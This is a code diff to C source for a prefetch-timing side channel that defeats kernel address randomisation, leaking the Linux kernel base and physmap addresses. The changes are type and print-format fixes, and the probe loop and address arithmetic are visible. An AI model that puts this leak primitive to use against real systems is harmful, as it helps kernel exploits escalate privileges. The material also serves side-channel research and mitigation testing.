@@ -1,6 +1,6 @@
 #include "kaslr.h"
 
-uint64_t sidechannel(uint64_t addr) {
+uint64_t sidechannel(size_t addr) {
   uint64_t a, b, c, d;
   asm volatile (".intel_syntax noprefix;"
     "mfence;"
@@ -30,8 +30,8 @@ void clean_cache(size_t base){
     for(int i=0;i<0x100;i++){
         // Access Order
         // int mess = (i*167+13)%0x200; // Makes no diff
-        int mess = i;
-        char *probe = mess*0x1000+base;
+        size_t mess = i;
+        size_t probe = (mess*0x1000+base);
         // prefecth access
         sidechannel(probe);
         // If we don't do clean_cache, we lose some suceess rate
@@ -58,7 +58,7 @@ uint64_t leak_syscall_entry(int pti,int boost)
             syscall(0x144,0x132,0x132); // Makes no diff but a little faster
             uint64_t time = sidechannel(SCAN_START + idx * STEP);
             if(!boost)
-                clean_cache(trash);
+                clean_cache((size_t)trash);
             if (i >= DUMMY_ITERATIONS)
                 data[idx] += time;
         }
@@ -102,7 +102,7 @@ size_t leakKASLR(int pti, size_t offset, int boost){
     // No pti so we leaked the address of Kernel Starts instead of entry_SYSCALL_64
     if(!pti) 
         val = val - entry_SYSCALL_64_offset;
-    printf ("KASLR  base %llx\n", val);
+    printf ("KASLR  base %p\n", (void *)val);
     return val;
 }
 
@@ -161,7 +161,7 @@ uint64_t leak_phys(void)
 }
 size_t leakPHYS(size_t offset){
     size_t val =  leak_phys()-0x100000000;
-    printf ("PHYSMAP base %llx\n",val);
+    printf ("PHYSMAP base %p\n",(void *)val);
     return val;
 }
 
